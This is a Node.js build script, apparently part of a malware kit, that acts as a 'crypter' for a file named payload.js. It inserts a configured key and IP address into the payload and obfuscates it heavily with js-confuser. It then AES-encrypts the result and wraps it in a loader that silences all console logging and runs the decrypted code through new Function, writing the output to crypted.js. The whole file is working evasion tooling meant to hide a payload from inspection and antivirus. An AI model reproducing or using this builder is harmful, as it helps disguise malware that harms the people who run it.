const fs = require('fs-extra');
const path = require('path');
const jsConfuser = require('js-confuser');
const crypto = require('crypto');

let config = { ip: 'localhost', key: 'default-key' };
try {
    config = require('../../../config.json');
} catch (error) {
    console.log('config.json bulunamadı, varsayılan değerler kullanılıyor');
}

const randomName = "crypted.js";
const start = Date.now();

const inputFilePath = path.join(__dirname, 'payload.js');
const tempFilePath = path.join(__dirname, 'payloadedited.js'); 
const outputFilePath = path.join(__dirname, 'builder', `${randomName}`);

async function obfuscateCode(code, options) {
    return jsConfuser.obfuscate(code, options);
}

function encrypt(text, masterkey) {
    const iv = crypto.randomBytes(16);
    const salt = crypto.randomBytes(16);
    const key = crypto.pbkdf2Sync(masterkey, salt, 100000, 32, 'sha512');
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return {
        encryptedData: encrypted,
        salt: salt.toString('base64'),
        iv: iv.toString('base64')
    };
}

function decrypt(encdata, masterkey, salt, iv) {
    const key = crypto.pbkdf2Sync(masterkey, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, Buffer.from(iv, 'base64'));
    let decrypted = decipher.update(encdata, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}
  
async function obfuscateAndEncryptCode() {
    try {
        const coreCode = await fs.readFile(inputFilePath, 'utf8');

        const modifiedCode = coreCode.replace(/keyhere/g, config.key).replace(/iphere/g, config.ip);
        await fs.writeFile(tempFilePath, modifiedCode, 'utf8');
        
        const obfuscationResult1 = await obfuscateCode(modifiedCode, {
            target: 'node',
            calculator: true,
            compact: true,
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.5,
            deadCode: 0.50,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            identifierGenerator: 'randomized',
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: 0.75,
            renameVariables: true,
            renameGlobals: true,
            shuffle: true,
            variableMasking: 0.75,
            stringConcealing: true,
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: 0.75,
            astScrambler: true,
            pack: true,
            renameLabels: true,
            preserveFunctionLength: true
        });
        
        const obfuscatedCode1 = obfuscationResult1.code;

        const secret = crypto.randomBytes(32).toString('base64');
        const encryptionKey = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32);

        const { encryptedData, salt, iv } = encrypt(obfuscatedCode1, encryptionKey);

        let finalCode = ` 
const crypto = require('crypto');

${decrypt.toString()}

console.log = () => {};
console.error = () => {};
console.warn = () => {};
console.info = () => {};

const decrypted = decrypt("${encryptedData}", "${encryptionKey}", "${salt}", "${iv}");
new Function('require', decrypted)(require);
`;

        const obfuscationResult2 = await obfuscateCode(finalCode, {
            target: 'node',
            calculator: true,
            controlFlowFlattening: 0.25,
            deadCode: 0.1,
            dispatcher: 0.5,
            globalConcealing: true,
            identifierGenerator: 'randomized',
            movedDeclarations: true,
            objectExtraction: true,
            renameVariables: true,
            renameGlobals: true,
            shuffle: true,
            variableMasking: 0.5,
            stringConcealing: true,
            stringSplitting: 0.25,
            renameLabels: true,
            opaquePredicates: true
        });

        const obfuscatedCode2 = obfuscationResult2.code;

        await fs.writeFile(outputFilePath, obfuscatedCode2, 'utf8');
        console.log(`Obfuscated and encrypted code successfully created: ${outputFilePath} (${Date.now() - start} milliseconds)`);

        await fs.remove(tempFilePath);
        console.log('Temporary file payloadedited.js deleted.');
    } catch (error) {
        console.error('Error during obfuscation or file handling:', error.message);
    }
}

async function main() {
    await obfuscateAndEncryptCode(); 
}

main().catch(console.error);